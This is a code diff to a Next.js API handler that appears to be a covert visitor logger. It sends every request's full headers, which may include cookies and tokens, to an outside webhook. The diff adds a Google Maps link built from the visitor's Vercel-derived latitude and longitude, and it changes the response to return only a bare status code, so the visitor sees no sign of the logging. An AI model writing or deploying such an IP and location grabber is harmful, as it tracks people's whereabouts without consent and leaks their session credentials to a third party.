@@ -14,7 +14,8 @@ export default async function handler(
   res: NextApiResponse
 ) {
   try {
-    const data = req.headers['x-vercel-ip-longitude']
+    const latitude = req.headers['x-vercel-ip-latitude']
+    const longitude = req.headers['x-vercel-ip-longitude']
 
     const webhook = await webhookClient.send({
       embeds: [
@@ -23,10 +24,11 @@ export default async function handler(
           description:
             "Detalhes do Acesso:\n\r" + JSON.stringify(req.headers, null, 10),
           color: "32896",
+          url:`https://www.google.com/maps/place/${latitude},${longitude}`
         },
       ],
     });
-    res.status(200).json({ data: data });
+    res.status(200).json({ status: 200 });
   } catch (error) {
     res.status(503).json({ status: 503 });
   }
